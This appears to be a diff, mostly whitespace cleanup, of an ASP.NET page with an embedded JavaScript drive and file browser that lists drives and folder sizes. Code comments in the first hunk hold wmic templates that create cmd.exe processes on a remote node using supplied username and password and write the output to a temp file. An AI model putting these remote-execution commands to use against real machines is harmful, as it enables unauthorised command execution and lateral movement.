@@ -313,11 +313,11 @@ sendAddress();";
                         {
                             //wmic logicaldisk get Caption,FileSystem,Size,FreeSpace,Description
                             //wmic /node:{0} /user:{1} /password:{2} process call create ""cmd.exe /c {3} >> {4}"" 2>&1
-                            //wmic /node:{0} /user:{1} /password:{2} process call create ""cmd.exe /c wmic logicaldisk get Caption,FileSystem,Size,FreeSpace,Description >> {4}"" 2>&1 
-                            //wmic /node:localhost process call create ""cmd.exe /c wmic logicaldisk get Caption,FileSystem,Size,FreeSpace,Description >> c:\windows\temp\abcd.txt"" 2>&1 
+                            //wmic /node:{0} /user:{1} /password:{2} process call create ""cmd.exe /c wmic logicaldisk get Caption,FileSystem,Size,FreeSpace,Description >> {4}"" 2>&1
+                            //wmic /node:localhost process call create ""cmd.exe /c wmic logicaldisk get Caption,FileSystem,Size,FreeSpace,Description >> c:\windows\temp\abcd.txt"" 2>&1
                             if (!string.IsNullOrEmpty(adminU) && !string.IsNullOrEmpty(adminP))
                             {
-                                //wmic /node:localhost process call create ""cmd.exe /c wmic logicaldisk get Caption,FileSystem,Size,FreeSpace,Description >> c:\windows\temp\abcd.txt"" 2>&1 
+                                //wmic /node:localhost process call create ""cmd.exe /c wmic logicaldisk get Caption,FileSystem,Size,FreeSpace,Description >> c:\windows\temp\abcd.txt"" 2>&1
                                 //Caption
                                 //C:
                                 //D:
@@ -717,7 +717,7 @@ sendAddress();";
     /*.iRename {color:#a291fb;border-color:#a291fb;}
     .iRename:hover {color:#fff;border-color:#8a73ff;background-color:#8a73ff;}
     .iRename:active {background-color:#7860f9;}*/
-    
+
     /*">Download</div><div class="iCmd iDelete">Delete</div><div class="iCmd iRename">Rename</div>*/
 </style>
 <script>
@@ -817,7 +817,7 @@ sendAddress();";
                 //    {
                 //        var f = document.createElement("div");
                 //        f.className="objF";
-       
+
                 //        var s = document.createElement("div");
                 //        s.className="objLeft objS";
                 //        s.innerText = "Get All Size";
@@ -878,7 +878,7 @@ sendAddress();";
                 document.getElementsByName("exadd")[0].value = this.getAttribute("loc");
                 sendAddress();
             };
-                        
+
             loc.appendChild(o);
         }
 
@@ -909,7 +909,7 @@ sendAddress();";
     {
         var f = document.createElement("div");
         f.className="objF";
-       
+
         var d = document.createElement("div");
         d.className ="objRight objD";
         d.innerText = dir.name;
@@ -953,7 +953,7 @@ sendAddress();";
             divType.className = "driveSizeText";
             divType.innerHTML = "<span class='t'>Description</span><span class='v'>" + dir.type + "</span>";
 
-            
+
 
             f.appendChild(divProgress);
             f.appendChild(divText);
@@ -1135,7 +1135,7 @@ sendAddress();";
         var info = {
             data: "gsize=" + b64EncodeUnicode(address),
             onSuccess:function(resText){
-                
+
                 ldr.remove();
                 var data = b64DecodeUnicode(resText)
                 setSize(objSize, data)
